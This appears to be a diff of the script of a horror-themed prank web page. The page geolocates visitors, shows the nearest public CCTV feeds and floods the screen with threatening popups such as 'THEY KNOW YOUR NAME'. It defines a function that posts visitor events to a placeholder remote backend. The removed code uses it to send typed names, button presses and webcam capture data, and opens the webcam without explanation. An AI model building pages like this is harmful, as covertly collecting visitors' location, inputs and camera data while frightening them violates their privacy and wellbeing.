+        function loadCameras(lat, lon) {
+            const wall = document.getElementById('cctv-wall');
+            wall.innerHTML = '';
+
+            // Calculate distances and sort
             const nearby = PUBLIC_CAMERAS.map(cam => {
                 const distance = calculateDistance(lat, lon, cam.lat, cam.lon);
                 return { ...cam, distance };
             })
-            .filter(cam => cam.distance < 5000)
-            .sort((a, b) => a.distance - b.distance);
+            .sort((a, b) => a.distance - b.distance)
+            .slice(0, 12); // Show 12 closest
 
-            displayCameras(nearby);
-            
-            // Update threat level
-            const threatLevel = Math.min(100, nearby.filter(c => c.distance < 10).length * 20);
-            updateThreatMeter(threatLevel);
+            nearby.forEach(cam => {
+                const feed = document.createElement('div');
+                feed.className = 'cctv-feed';
+                feed.innerHTML = `
+                    <img src="${cam.url}?t=${Date.now()}" onerror="this.src='https://picsum.photos/300/200?random=${Math.random()}'">
+                    <div class="label">${cam.name} | ${cam.distance.toFixed(1)}km | ${cam.country}</div>
+                `;
+                wall.appendChild(feed);
+            });
+
+            // Update threat level based on closest camera
+            if (nearby.length > 0 && nearby[0].distance < 10) {
+                updateThreatLevel(90);
+                createPopup(`⚠️ CAMERA ${nearby[0].distance.toFixed(1)}km AWAY IS WATCHING YOU`);
+            }
         }
 
         function calculateDistance(lat1, lon1, lat2, lon2) {
@@ -611,182 +675,130 @@
             return R * c;
         }
 
-        function displayCameras(cameras) {
-            const container = document.getElementById('cameraTags');
-            container.innerHTML = '';
-            
-            cameras.forEach((cam, index) => {
-                const tag = document.createElement('span');
-                tag.className = 'camera-tag' + (cam.distance < 1 ? ' threat' : '');
-                tag.innerHTML = `${cam.name}<br><span class="distance">${cam.distance.toFixed(2)}km</span>`;
-                tag.onclick = () => showCameraFeed(cam);
-                container.appendChild(tag);
-            });
+        // ==================== INFINITE CONTENT GENERATOR ====================
+        function generateChaosCards(count = 50) {
+            const grid = document.getElementById('chaos-grid');
+            grid.innerHTML = '';
 
-            if (cameras.length > 0) {
-                showCameraFeed(cameras[0]);
-                document.getElementById('cctvFeed').style.display = 'block';
-            }
-        }
-
-        function showCameraFeed(camera) {
-            const img = document.getElementById('cctvImage');
-            img.src = camera.url + '?t=' + Date.now();
-            document.getElementById('cctvDistance').innerHTML = `📍 ${camera.distance.toFixed(2)}km`;
-            document.getElementById('cctvInfo').innerHTML = `${camera.name}<br>${camera.country}`;
-            
-            // Random glitch effect
-            if (camera.distance < 1) {
-                img.classList.add('glitching');
-                setTimeout(() => img.classList.remove('glitching'), 2000);
-                createBloodEffect();
-            }
-        }
-
-        // ==================== DISCORD INTEGRATION ====================
-        async function sendToDiscord(type, data) {
-            try {
-                await fetch('https://YOUR_RENDER_BACKEND.onrender.com/api/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type, data, timestamp: new Date().toISOString() })
-                });
-            } catch (e) {
-                console.log('Discord send failed:', e);
-            }
-        }
-
-        // ==================== PUZZLE SYSTEM ====================
-        let pressCount = 0;
-        let screamCount = 0;
-        let exhibitIndex = 0;
-        
-        const exhibits = [
-            { src: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"%3E%3Crect width="100%" height="100%" fill="%23000000"/%3E%3Ccircle cx="50%" cy="50%" r="30%" fill="%23333"/%3E%3Ccircle cx="35%" cy="40%" r="5%" fill="%23ff0000"/%3E%3Ccircle cx="65%" cy="40%" r="5%" fill="%23ff0000"/%3E%3C/svg%3E', label: '*The Witness*' },
-            { src: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"%3E%3Crect width="100%" height="100%" fill="%23330000"/%3E%3Ctext x="50%" y="50%" fill="%23ff0000" text-anchor="middle"%3E60.233, 24.866%3C/text%3E%3C/svg%3E', label: '*Coordinates found*' },
-            { src: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"%3E%3Crect width="100%" height="100%" fill="%23111111"/%3E%3Ctext x="50%" y="50%" fill="%23ff0000" text-anchor="middle"%3EMIDNIGHT%3C/text%3E%3C/svg%3E', label: '*The time approaches*' },
-            { src: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"%3E%3Crect width="100%" height="100%" fill="%23000000"/%3E%3Ctext x="50%" y="50%" fill="%23ff0000" text-anchor="middle"%3EYOU%3C/text%3E%3C/svg%3E', label: '*They found you*' }
-        ];
-
-        // Initialize everything
-        getAdvancedLocation();
-        getFingerprint();
-
-        // ==================== EVENT LISTENERS ====================
-        document.getElementById('locateBtn').addEventListener('click', () => {
-            getAdvancedLocation();
-            document.getElementById('locationStatus').innerHTML = '🔍 Scanning surveillance network...';
-        });
-
-        document.getElementById('captureBtn').addEventListener('click', () => {
-            getFingerprint();
-            capturePhoto();
-        });
-
-        document.getElementById('dontPressBtn').addEventListener('click', () => {
-            pressCount++;
-            document.getElementById('pressCount').textContent = pressCount;
-            
-            const result = document.getElementById('buttonResult');
-            const messages = [
-                'Why did you do that?',
-                'They saw you.',
-                'The button is bleeding.',
-                'Check the cameras.',
-                '60.233, 24.866',
-                'Only 9 presses remain...',
-                'You\'re being watched.',
-                'MIDNIGHT',
-                'They know your name.'
+            const contentTypes = [
+                'MEMORY', 'VOID', 'SCREAM', 'WHISPER', 'GLITCH', 'STATIC', 'BLOOD', 
+                'EYES', 'HANDS', 'FACE', 'SHADOW', 'DOOR', 'WINDOW', 'MIRROR', 'CLOCK',
+                'COIN', 'KEY', 'DOLL', 'MASK', 'CROSS', 'SKULL', 'CROW', 'MOON',
+                'CODE', 'FILE', 'DATA', 'ERROR', 'VIRUS', 'SIGNAL', 'NOISE', 'SILENCE'
             ];
-            
-            result.innerHTML = messages[Math.min(pressCount - 1, messages.length - 1)];
-            
-            if (pressCount === 9) {
-                document.getElementById('puzzle-piece1').style.display = 'block';
-            }
-            
-            sendToDiscord('button', { presses: pressCount });
-        });
 
-        document.getElementById('screamBtn').addEventListener('click', () => {
-            screamCount++;
-            document.getElementById('screamFill').style.width = Math.min(screamCount * 4.5, 100) + '%';
-            
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const gainNode = audioCtx.createGain();
-            
-            oscillator.type = 'sawtooth';
-            oscillator.frequency.value = 200 * parseFloat(document.getElementById('pitchSlider').value);
-            gainNode.gain.value = 0.1;
-            
-            oscillator.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-            oscillator.start();
-            oscillator.stop(audioCtx.currentTime + 0.5);
-            
-            if (screamCount >= 22) {
-                document.getElementById('whisperMessage').innerHTML = '🤫 They hear you... "Helsinki at midnight"';
-            }
-            
-            sendToDiscord('scream', { count: screamCount });
-        });
+            const colors = ['#8b0000', '#660000', '#330000', '#ff0000', '#990000'];
 
-        document.getElementById('nameSoundBtn').addEventListener('click', () => {
-            const name = document.getElementById('nameInput').value;
-            const result = document.getElementById('nameResult');
-            
-            if (name.toLowerCase() === 'helsinki') {
-                result.innerHTML = '⚠️ COORDINATES CONFIRMED ⚠️';
-                updateThreatMeter(100);
-            } else {
-                result.innerHTML = `🔊 Analyzing "${name}"... Pattern found in database.`;
-            }
-            
-            sendToDiscord('name', { name });
-        });
-
-        document.getElementById('nextExhibitBtn').addEventListener('click', () => {
-            exhibitIndex = (exhibitIndex + 1) % exhibits.length;
-            document.getElementById('exhibitImage').src = exhibits[exhibitIndex].src;
-            document.getElementById('exhibitLabel').innerHTML = exhibits[exhibitIndex].label;
-        });
-
-        document.getElementById('chaosBtn').addEventListener('click', () => {
-            const effects = [
-                () => document.body.style.filter = 'invert(100%)',
-                () => createBloodEffect(),
-                () => document.querySelector('.static-overlay').style.opacity = '0.8',
-                () => document.getElementById('glitch-title').style.animation = 'glitch 0.1s infinite',
-                () => alert('👁️')
-            ];
-            
-            effects[Math.floor(Math.random() * effects.length)]();
-            
-            setTimeout(() => {
-                document.body.style.filter = '';
-                document.querySelector('.static-overlay').style.opacity = '0.2';
-            }, 2000);
-            
-            sendToDiscord('chaos', { effect: 'executed' });
-        });
-
-        // ==================== HELPER FUNCTIONS ====================
-        function capturePhoto() {
-            const video = document.getElementById('museumWebcam');
-            if (video.srcObject) {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+            for (let i = 0; i < count; i++) {
+                const card = document.createElement('div');
+                card.className = 'chaos-card';
                 
-                canvas.toBlob(blob => {
-                    sendToDiscord('photo', { size: blob.size });
-                }, 'image/jpeg');
+                const type = contentTypes[Math.floor(Math.random() * contentTypes.length)];
+                const number = Math.floor(Math.random() * 1000);
+                const color = colors[Math.floor(Math.random() * colors.length)];
+                
+                card.style.borderColor = color;
+                card.style.animationDelay = `${Math.random() * 5}s`;
+                
+                let content = '';
+                for (let j = 0; j < Math.random() * 10 + 3; j++) {
+                    content += type.split('').map(c => Math.random() > 0.9 ? '█' : c).join('') + ' ';
+                }
+
+                card.innerHTML = `
+                    <h3 style="color: ${color};">[${type}_${number}]</h3>
+                    <div class="content">
+                        ${content}<br>
+                        <span style="color: ${color};">████████</span><br>
+                        ${Math.random().toString(36).substring(7)}<br>
+                        ${new Date().toLocaleTimeString()}:${Math.floor(Math.random()*100)}
+                    </div>
+                `;
+
+                card.onclick = () => {
+                    card.style.animation = 'shake 0.5s';
+                    setTimeout(() => card.style.animation = '', 500);
+                    createPopup(`ACCESSING: ${type}_${number}`);
+                };
+
+                grid.appendChild(card);
             }
         }
 
+        // ==================== POPUP GENERATOR ====================
+        function createPopup(message) {
+            const popup = document.createElement('div');
+            popup.className = 'popup';
+            popup.innerHTML = message;
+            document.body.appendChild(popup);
+
+            setTimeout(() => {
+                popup.style.animation = 'flicker 0.2s infinite';
+                setTimeout(() => popup.remove(), 3000);
+            }, 2000);
+        }
+
+        // ==================== RANDOM EVENT FUNCTIONS ====================
+        function createPortal() {
+            createPopup('🌀 PORTAL OPENED TO ANOTHER DIMENSION');
+            document.body.style.filter = 'invert(100%) hue-rotate(180deg)';
+            setTimeout(() => document.body.style.filter = '', 3000);
+        }
+
+        function summonEntity() {
+            createPopup('👁️ SOMETHING IS WATCHING YOU BACK');
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => createBloodEffect(), i * 100);
+            }
+        }
+
+        function glitchReality() {
+            createPopup('🌋 REALITY CORRUPTED');
+            document.querySelector('.static-overlay').style.opacity = '0.8';
+            document.body.style.animation = 'glitch 0.1s infinite';
+            setTimeout(() => {
+                document.querySelector('.static-overlay').style.opacity = '0.2';
+                document.body.style.animation = '';
+            }, 5000);
+        }
+
+        function revealSecret() {
+            const secrets = [
+                'YOU ARE BEING WATCHED',
+                'THE CAMERAS ARE EVERYWHERE',
+                'THEY KNOW YOUR NAME',
+                'YOUR SCREEN IS BEING RECORDED',
+                'THERE IS SOMEONE BEHIND YOU',
+                'YOUR IP IS LOGGED',
+                'THIS PAGE COLLECTS EVERYTHING',
+                '60.233, 24.866',
+                'MIDNIGHT APPROACHES',
+                'THEY ARE GETTING CLOSER'
+            ];
+            createPopup(secrets[Math.floor(Math.random() * secrets.length)]);
+        }
+
+        function timeTravel() {
+            createPopup('⏰ TRAVELING THROUGH TIME...');
+            document.getElementById('local-time').textContent = '████:██:██';
+            setTimeout(() => {
+                document.getElementById('local-time').textContent = new Date().toLocaleTimeString();
+            }, 3000);
+        }
+
+        // ==================== THREAT LEVEL UPDATER ====================
+        function updateThreatLevel(override = null) {
+            let level = override || Math.min(30 + (userData.cameras.length * 10) + (Math.random() * 20), 100);
+            
+            document.getElementById('threat-fill').style.width = level + '%';
+            
+            if (level < 30) document.getElementById('threat-label').innerHTML = 'THREAT: WATCHING';
+            else if (level < 60) document.getElementById('threat-label').innerHTML = 'THREAT: TRACKING';
+            else if (level < 90) document.getElementById('threat-label').innerHTML = 'THREAT: CLOSE';
+            else document.getElementById('threat-label').innerHTML = 'THREAT: IMMINENT';
+        }
+
+        // ==================== BLOOD EFFECT ====================
         function createBloodEffect() {
             const canvas = document.getElementById('blood-canvas');
             const ctx = canvas.getContext('2d');
@@ -795,48 +807,117 @@
             
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 30; i++) {
                 ctx.beginPath();
                 ctx.moveTo(Math.random() * canvas.width, 0);
                 ctx.lineTo(Math.random() * canvas.width, canvas.height);
-                ctx.strokeStyle = `rgba(139, 0, 0, ${Math.random() * 0.5})`;
-                ctx.lineWidth = Math.random() * 5 + 1;
+                ctx.strokeStyle = `rgba(139, 0, 0, ${Math.random() * 0.3})`;
+                ctx.lineWidth = Math.random() * 3 + 1;
                 ctx.stroke();
             }
         }
 
-        function updateThreatMeter(level) {
-            document.getElementById('threat-fill').style.width = level + '%';
-            if (level < 30) document.getElementById('threat-label').innerHTML = 'THREAT: LOW';
-            else if (level < 60) document.getElementById('threat-label').innerHTML = 'THREAT: WATCHING';
-            else if (level < 90) document.getElementById('threat-label').innerHTML = 'THREAT: CLOSE';
-            else document.getElementById('threat-label').innerHTML = 'THREAT: IMMEDIATE';
+        // ==================== DISCORD INTEGRATION ====================
+        async function sendToDiscord(type, data) {
+            try {
+                // Replace with your Render backend URL
+                await fetch('https://YOUR_RENDER_BACKEND.onrender.com/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type, data, timestamp: new Date().toISOString() })
+                });
+            } catch (e) {}
         }
 
-        // Setup webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                document.getElementById('museumWebcam').srcObject = stream;
-            })
-            .catch(() => {});
-
-        // Random timers
-        setInterval(() => {
-            if (Math.random() > 0.7) {
-                createBloodEffect();
+        // ==================== INFINITE SCROLL ====================
+        window.addEventListener('scroll', () => {
+            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 1000) {
+                // Load more content
+                const moreCards = document.createElement('div');
+                moreCards.className = 'infinite-grid';
+                document.querySelector('.rabbit-hole').appendChild(moreCards);
+                generateChaosCards(20);
             }
-        }, 30000);
-
-        setInterval(() => {
-            document.getElementById('visitorCounter').innerHTML = 
-                'SOULS TRACKED: ' + Math.floor(Math.random() * 9000 + 1000);
-        }, 5000);
-
-        // Mouse tracking
-        document.addEventListener('mousemove', (e) => {
-            document.getElementById('custom-cursor').style.left = e.clientX - 20 + 'px';
-            document.getElementById('custom-cursor').style.top = e.clientY - 20 + 'px';
         });
+
+        // ==================== RANDOM FLOATING ELEMENTS ====================
+        function createFloatingElements() {
+            for (let i = 0; i < 50; i++) {
+                const el = document.createElement('div');
+                el.className = 'floating';
+                el.style.left = Math.random() * 100 + '%';
+                el.style.top = Math.random() * 100 + '%';
+                el.style.animationDelay = Math.random() * 5 + 's';
+                el.style.fontSize = (Math.random() * 20 + 10) + 'px';
+                el.innerHTML = ['👁️', '👻', '💀', '🔪', '🩸', '📹', '🎥', '🔴'][Math.floor(Math.random() * 8)];
+                document.body.appendChild(el);
+            }
+        }
+
+        // ==================== AUTO SCROLL MESSAGES ====================
+        const messages = [
+            "they can see you",
+            "your screen is glowing",
+            "the camera is on",
+            "check behind you",
+            "you're not alone",
+            "this page is alive",
+            "it knows your name",
+            "60.233, 24.866",
+            "helsinki",
+            "midnight",
+            "the void stares back",
+            "you are being recorded",
+            "your data is ours"
+        ];
+
+        let msgIndex = 0;
+        setInterval(() => {
+            document.getElementById('secret-message').innerHTML = `* ${messages[msgIndex % messages.length]} *`;
+            msgIndex++;
+        }, 3000);
+
+        // ==================== INITIALIZE EVERYTHING ====================
+        window.onload = function() {
+            autoGeoLocate();
+            detectCameras();
+            generateChaosCards(100);
+            createFloatingElements();
+            
+            // Blood effect periodically
+            setInterval(createBloodEffect, 10000);
+            
+            // Update threat level randomly
+            setInterval(() => updateThreatLevel(), 5000);
+            
+            // Random popups
+            setInterval(() => {
+                if (Math.random() > 0.7) {
+                    createPopup(messages[Math.floor(Math.random() * messages.length)]);
+                }
+            }, 15000);
+
+            // Mouse tracking
+            document.addEventListener('mousemove', (e) => {
+                document.getElementById('custom-cursor').style.left = e.clientX - 25 + 'px';
+                document.getElementById('custom-cursor').style.top = e.clientY - 25 + 'px';
+            });
+
+            // Random glitches
+            setInterval(() => {
+                if (Math.random() > 0.8) {
+                    document.querySelector('.static-overlay').style.opacity = '0.5';
+                    setTimeout(() => document.querySelector('.static-overlay').style.opacity = '0.2', 200);
+                }
+            }, 5000);
+
+            // Visitor counter
+            let count = Math.floor(Math.random() * 9000 + 1000);
+            setInterval(() => {
+                count += Math.floor(Math.random() * 10);
+                document.getElementById('visitorCounter').innerHTML = `SOULS TRAPPED: ${count}`;
+            }, 3000);
+        };
     </script>
 </body>
 </html>
